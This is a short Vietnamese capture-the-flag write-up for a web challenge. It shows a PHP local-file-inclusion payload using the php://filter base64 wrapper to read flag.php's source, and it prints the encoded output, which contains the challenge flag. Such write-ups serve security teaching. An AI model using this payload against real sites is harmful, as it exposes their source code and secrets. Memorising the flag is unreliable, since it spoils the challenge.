Sau khi mở web ta truy cập vào phần source và đi vào đường dẫn đã cho.  

<img width="603" alt="image" src="https://user-images.githubusercontent.com/125866921/224554218-53e8a05c-e803-43c1-a66a-9c6a07721f1f.png">

Nhấp vào đường dẫn.  

<img width="1278" alt="image" src="https://user-images.githubusercontent.com/125866921/224554272-3300a963-5457-4605-944d-d789c9af6e76.png">

Ta có thể thấy được đây chính là chủ đề giả giao thức php, giao thức giả này đọc mã nguồn và thực hiện đầu ra được mã hóa base64 , nếu không, nó sẽ được thực thi trực tiếp dưới dạng mã php và nội dung mã nguồn sẽ không hiển thị.  

    ?file=php://filter/read=convert.base64-encode/resource=flag.php  

sau đó tận được 1 chuỗi kí tự từ trang web.  

    PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YTJjOTk2YzYtMDY3OS00YmZmLWFjNmQtOWNjMDIxYjQ0OTAzfQo=  

Dễ dàng nhận thấy đây là mã hóa base64, ta giải mã và lấy flag.  

flag{---------}
